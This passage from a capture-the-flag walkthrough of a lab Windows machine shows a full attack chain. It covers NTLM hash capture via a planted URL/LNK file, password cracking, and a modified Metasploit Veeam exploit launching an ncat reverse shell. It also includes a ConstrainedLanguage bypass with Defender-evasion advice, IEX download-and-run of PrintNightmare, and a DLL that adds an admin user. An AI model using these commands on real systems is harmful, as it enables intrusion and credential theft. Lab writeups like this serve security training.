<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-Perl" data-lang="Perl"><span style="display:flex;"><span>myrtleowe:<span style="color:#e6db74">&lt;Redacted&gt;</span>
</span></span></code></pre></div><p>From here, we can use SMB to enumerate shares.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.167.18<span style="color:#ae81ff">\\</span> -U <span style="color:#e6db74">"myrtleowe"</span>
</span></span></code></pre></div><p><img alt="" src="/set/20220426225450.png"/></p>
<p>And we can indeed see a non-default share called <code>Files.</code> We try to use that share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient <span style="color:#ae81ff">\\\\</span>10.10.167.18<span style="color:#ae81ff">\\</span>Files -U <span style="color:#e6db74">"myrtleowe"</span>
</span></span></code></pre></div><p>Inside the share, we got an Info.txt. Opening the file, we get our first flag and a small note.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-Perl" data-lang="Perl"><span style="display:flex;"><span>Zip <span style="color:#f92672">and</span> save your project files here<span style="color:#f92672">.</span> 
</span></span><span style="display:flex;"><span>We will review them
</span></span></code></pre></div><p>So we can upload a zip file into share, and they will review it. As we have to write access to the share, we can create a zip with a file that executes without opening it and then we can force NTLM authentication to grab their hash. In this scenario, we can create a few types of files, like <code>scf</code>, <code>ink</code>, <code>url</code>. In this walkthrough, we will use <code>url</code> and <code>ink</code> methods to grab the hash. First let get start with <code>url</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>[InternetShortcut]
</span></span><span style="display:flex;"><span>URL<span style="color:#f92672">=</span>whatever
</span></span><span style="display:flex;"><span>WorkingDirectory<span style="color:#f92672">=</span>whatever
</span></span><span style="display:flex;"><span>IconFile<span style="color:#f92672">=\\</span><span style="color:#ae81ff">10.17.41.47</span><span style="color:#f92672">\</span>anything<span style="color:#f92672">.</span>icon
</span></span><span style="display:flex;"><span>IconIndex<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>First, we create a URL file; with this content, the file will request our SMB share to access the icon file, And we start the responder to force NTLM authentication. As they are only accpeting zip, we create a zip file for it.</p>
<p><img alt="" src="/set/20220427223659.png"/></p>
<p>Now that we have a zip, we upload it to the writeable share.</p>
<p><img alt="" src="/set/20220427223729.png"/></p>
<p>And after a few seconds, we were able to get the hash.</p>
<p><img alt="" src="/set/20220427224126.png"/></p>
<p>We try to crack the hash using <code>john.</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span><span style="color:#e6db74">'/usr/share/wordlists/rockyou.txt'</span> hash
</span></span></code></pre></div><p>And after 7 seconds, we got the cracked password.</p>
<p><img alt="" src="/set/20220427224034.png"/></p>
<p>We can try to get a Winrm session as we have another credential.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo crackmapexec smb <span style="color:#e6db74">"10.10.120.14"</span> -u <span style="color:#e6db74">'MichelleWat'</span> -p <span style="color:#e6db74">'!!!MICKEYmouse'</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo crackmapexec winrm 10.10.120.14 -u <span style="color:#e6db74">'MichelleWat'</span> -p <span style="color:#e6db74">'!!!MICKEYmouse'</span>
</span></span></code></pre></div><p><img alt="" src="/set/20220427224434.png"/></p>
<p>And using the credentials, we are in. Moving to <code>Desktop</code>, we have our second flag. I have shown it in the appendix menu if you are looking to grab a file using the <code>lnk</code> file.</p>
<p><img alt="" src="/set/20220427224525.png"/></p>
<h2 id="privilege-escalation">Privilege Escalation:</h2>
<p>Now we move forward to get administrator access to the system; we try to use automated scripts to enumerate. Let us try to upload <a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a> by <a href="https://github.com/itm4n">itm4n</a>.</p>
<p><img alt="" src="/set/20220429142606.png"/></p>
<p>Well, we are blocked by a PowerShell security feature called <code>LanguageMode.</code> To enumerate which LanguageMode is on our session, we can use a PowerShell command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>$ExecutionContext.SessionState.LanguageMode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Values could be: FullLanguage or ConstrainedLanguage</span>
</span></span></code></pre></div><p><img alt="" src="/set/20220429142808.png"/></p>
<p>The <code>ConstrainedLanguage</code> is a security feature created by Microsoft to stop the execution of malicious PowerShell payloads.</p>
<h3 id="manual-enumeration">Manual Enumeration</h3>
<p>We did some manual enumeration, and after a while, we came across local open ports.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span><span style="color:#75715e"># netstat -ao</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Active Connections
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Proto  Local Address          Foreign Address        State           PID
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>80             SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>135            SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       984
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>443            SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>445            SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>2805           SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       3180
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>3389           SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       856
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>5985           SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>47001          SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>49664          SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       696
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>49665          SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       1104
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>49666          SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       848
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>49667          SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       788
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>49668          SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       1176
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>49670          SET<span style="color:#960050;background-color:#1e0010">:</span>0                  LISTENING       772
</span></span></code></pre></div><p>We see an unusual port that the port didn’t expose, and we couldn’t see on Nmap scan <code>0.0.0.0:2805</code>; searching for the PID, we came to know that the service is <code>Veeam.One.Agent.Service.</code></p>
<pre tabindex="0"><code>Get-Process -Id &lt;PID_OF_Port&gt;
</code></pre><p><img alt="" src="/set/20220503142921.png"/></p>
<p>Now we can search in dept for version and search for public exploits. Looking into <code>C:\Program Files</code>, we have a directory name <code>Veeam .</code>Looking into more dept, we used <code>ls</code> and <code>Format-List</code> to get more information on the executable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>ls <span style="color:#e6db74">'Veeam.One.Agent.Service.exe'</span> | Format-List *
</span></span></code></pre></div><p><img alt="" src="/set/20220503143636.png"/></p>
<p>Searching for public exploits, we found a <a href="https://www.rapid7.com/db/modules/exploit/windows/misc/veeam_one_agent_deserialization/">metasploit’s exploit</a>
Now first, we have to forward the port using the chisel. We start the server on our Linux machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chisel server -p <span style="color:#ae81ff">4444</span> --reverse
</span></span></code></pre></div><p>We use <code>Invoke-Webrequest</code> and upload the <code>Chisel.exe</code> to the victim box. And we run it by giving a few arguments.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-Webrequest -URI http<span style="color:#960050;background-color:#1e0010">:</span>//10.17.41.47/chisel.exe -Out C:\temp\c.exe
</span></span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>.\c.exe client 10.17.41.47<span style="color:#960050;background-color:#1e0010">:</span>4444 R:2805<span style="color:#960050;background-color:#1e0010">:</span>127.0.0.1<span style="color:#960050;background-color:#1e0010">:</span>2805
</span></span></code></pre></div><p><img alt="" src="/set/20220503144505.png"/></p>
<p><img alt="" src="/set/20220503144515.png"/></p>
<p>And it got connected to our server, so now we can use Nmap to check if it worked or not.</p>
<p><img alt="" src="/set/20220503144655.png"/></p>
<p>Running the exploit, we got it working, but no session created.</p>
<p><img alt="" src="/set/20220503144242.png"/></p>
<p>This is beacuse the Windows Defender is blocking the payloads.
First, we create a <code>temp</code> directory, then using <code>Invoke-Webrequest,</code> we transfer files, and then most importantly, we need to change permission so that any user can access it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>mkdir /temp
</span></span><span style="display:flex;"><span>Invoke-Webrequest -URI http<span style="color:#960050;background-color:#1e0010">:</span>//10.17.41.47/ncat.exe -Out C:\temp\n.exe
</span></span><span style="display:flex;"><span>cacls \temp\n.exe /e /p Everyone<span style="color:#960050;background-color:#1e0010">:</span>f
</span></span></code></pre></div><p>For this we will use a <code>ncat.exe</code> that bypasses defender.</p>
<h3 id="customizing-the-exploit">Customizing the exploit</h3>
<p>First, we copy the original exploit. Then we open it in a text editor. Looking at the source code, we must modify a few things; we first add a custom command execution; this means we will create a new <code>Target.</code>
This is the basic idea for adding a new target</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">'NAME OF TARGET, '</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  	<span style="color:#e6db74">'Arch'</span> <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span><span style="color:#66d9ef">ARCH_X86</span> <span style="color:#f92672">or</span> <span style="color:#66d9ef">ARCH_X64</span> <span style="color:#f92672">or</span> <span style="color:#66d9ef">ARCH_CMD</span><span style="color:#f92672">]</span>,
</span></span><span style="display:flex;"><span>	  	<span style="color:#e6db74">'Type'</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">:TYPE</span>,
</span></span><span style="display:flex;"><span>	  	<span style="color:#e6db74">'DefaultOptions'</span> <span style="color:#f92672">=&gt;</span> 
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">'PAYLOAD'</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">'MSF Payload'</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>
</span></span></code></pre></div><p>So using this template, we create a new target that executes a custom command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">'Windows Custom Command'</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">'Arch'</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">ARCH_CMD</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">'Type'</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">:win_cmd2</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">'DefaultOptions'</span> <span style="color:#f92672">=&gt;</span> 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">'PAYLOAD'</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">'windows/x64/exec'</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Now that we have created a target, we add this to the source code. And we keep this option as default.</p>
<p><img alt="" src="/set/20220503141112.png"/></p>
<p>Now we have added a target, but we need to add <code>options</code> to the target, for this we modify <code>register_options.</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>register_options(<span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>  	<span style="color:#66d9ef">Opt</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RPORT</span>(<span style="color:#ae81ff">2805</span>),
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">'HOSTINFO_NAME'</span>,<span style="color:#f92672">[</span><span style="color:#66d9ef">true</span>, <span style="color:#e6db74">'Name to send in host info (must be recognized by server!)'</span>, <span style="color:#e6db74">'AgentController'</span><span style="color:#f92672">]</span>)<span style="color:#f92672">]</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>We add a new <code>CMD</code> option into the <code>register_options.</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">'CMD'</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">"The command to execute"</span>, <span style="color:#e6db74">'whoami &gt; /windows/temp/whoam.txt'</span> <span style="color:#f92672">]</span>),
</span></span></code></pre></div><p><img alt="" src="/set/20220503141446.png"/></p>
<p>Now the last part, we have to add this into the <code>exploit</code> function. Looking at the function, we have to change the <code>case</code> and <code>when,</code> adding our own type <code>win_cmd2.</code> This is the default cases in the payload.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> target<span style="color:#f92672">[</span><span style="color:#e6db74">'Type'</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">when</span> <span style="color:#e6db74">:win_cmd</span>
</span></span><span style="display:flex;"><span>	  execute_command(payload<span style="color:#f92672">.</span>encoded)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">when</span> <span style="color:#e6db74">:win_dropper</span>
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e"># TODO: Create an option to execute the full stager without hacking</span>
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e"># :linemax or calling execute_command(generate_cmdstager(...).join(...))</span>
</span></span><span style="display:flex;"><span>	  execute_cmdstager(
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">flavor</span>: <span style="color:#e6db74">:psh_invokewebrequest</span>, <span style="color:#75715e"># NOTE: This requires PowerShell &gt;= 3.0</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">linemax</span>: <span style="color:#ae81ff">9001</span> <span style="color:#75715e"># It's over 9000</span>
</span></span><span style="display:flex;"><span>	  )
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">when</span> <span style="color:#e6db74">:psh_stager</span>
</span></span><span style="display:flex;"><span>	  execute_command(cmd_psh_payload(
</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">.</span>encoded,
</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">.</span>arch<span style="color:#f92672">.</span>first,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">remove_comspec</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	  ))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>We just add our custom type.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">when</span> <span style="color:#e6db74">:win_cmd2</span>
</span></span><span style="display:flex;"><span>	execute_command(datastore<span style="color:#f92672">[</span><span style="color:#e6db74">'CMD'</span><span style="color:#f92672">]</span>)
</span></span></code></pre></div><p>So the final condition should look like this:</p>
<p><img alt="" src="/set/20220503142239.png"/></p>
<p>Now our custom exploit looks prefect, we save the file and start msfconsole.</p>
<pre tabindex="0"><code>use windows/misc/veeam_one_agent_deserialization
set RHOSTS 127.0.0.1
set CMD C:\temp\n.exe 10.17.41.47 1337 -e cmd.exe
</code></pre><p><img alt="" src="/set/20220503145340.png"/></p>
<p>Running the exploit, we get a shell as <code>set</code> user. And the user is part of administrator.</p>
<p><img alt="" src="/set/20220503145434.png"/></p>
<h2 id="appendix">Appendix</h2>
<h3 id="lnk-hash-grab">Lnk Hash Grab</h3>
<p>First of all, these are just links; When creating a file shortcut, this is the thing that is created. To create a shortcut link file, we use a tool called <a href="https://www.mamachine.org/mslink/index.en.html">mslink</a>. We download the bash version and generate an <code>lnk</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./mslink_v1.3.sh -l not important -n shortcut -i <span style="color:#ae81ff">\\\\</span>10.17.41.47<span style="color:#ae81ff">\\</span>test -o shortcut.lnk
</span></span></code></pre></div><p>Zip it again and then upload it to the writeable shares. After a few seconds, we should get hash.</p>
<h3 id="bypass-constrainedlanguage">Bypass ConstrainedLanguage</h3>
<p>Let’s look at how we can bypass language mode using <a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a>. First, we clone the repo, compile it using Visual Studio. Make sure to obfucate the code so that windows defender doesn’t catch it.</p>
<p><img alt="" src="/set/20220429144154.png"/></p>
<p>Now we upload the executable. We are using <code>Invoke-Webrequest.</code></p>
<pre tabindex="0"><code>Invoke-Webrequest -URI http://10.17.41.47/PsBypassCLM.exe -Out p.exe
</code></pre><p>Now we can run and get a reverse shell like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.17.41.47 /rport=1337 /U C:\temp\p.exe
</span></span></code></pre></div><p>And we should get a call back on our nc.</p>
<p><img alt="" src="/set/20220503161954.png"/></p>
<h3 id="printer-spooler">Printer Spooler</h3>
<p>Once we are able to execute powershell, we upload <a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare</a> and we create a custom dll to add our own user to the system.
The custom dll looks like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (ul_reason_for_call)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
</span></span><span style="display:flex;"><span>      system(<span style="color:#e6db74">"net user sha5hwat 'P@ssword1!!' /add"</span>);
</span></span><span style="display:flex;"><span>      system(<span style="color:#e6db74">"net localgroup Administrators sha5hwat /add"</span>);
</span></span><span style="display:flex;"><span>      system(<span style="color:#e6db74">"net localgroup </span><span style="color:#ae81ff">\"</span><span style="color:#e6db74">Remote Management Users</span><span style="color:#ae81ff">\"</span><span style="color:#e6db74"> sha5hwat /add"</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We will compile it in linux machine using <code>x86_64-w64-mingw32-gcc.</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>x86_64-w64-mingw32-gcc rev.cpp -shared -o rev.dll
</span></span></code></pre></div><p>Now we execute a powershell script in memory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>IEX(New-Object Net.WebClient).downloadString(<span style="color:#e6db74">'http://10.17.41.47/CVE-2021-1675.ps1'</span>)
</span></span></code></pre></div><p>Executing the above command we got a hit on our http server, and now we can upload our own custom dll, that we want to execute with the PrintNightmare.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-Webrequest -URI http<span style="color:#960050;background-color:#1e0010">:</span>//10.17.41.47/rev.dll -Out pwn.dll
</span></span></code></pre></div><p>Now that we have both the thing ready, we can simply execute PrintNightmare.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-Nightmare -DLL C:\temp\pwn.dll
</span></span></code></pre></div><p>Now that we exeuted that, we can execute a command to get check if the user is created or not.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>net user sha5hwat
</span></span></code></pre></div><p>And from the output we can see, we are in admins groups and we can read the root flag.</p>
<p><img alt="" src="/set/20220503201315.png"/></p>
<p><img alt="" src="/set/20220503201338.png"/></p>
</div>
<div class="post-footer">
</div>
</article>
</main>
</body>
</html>
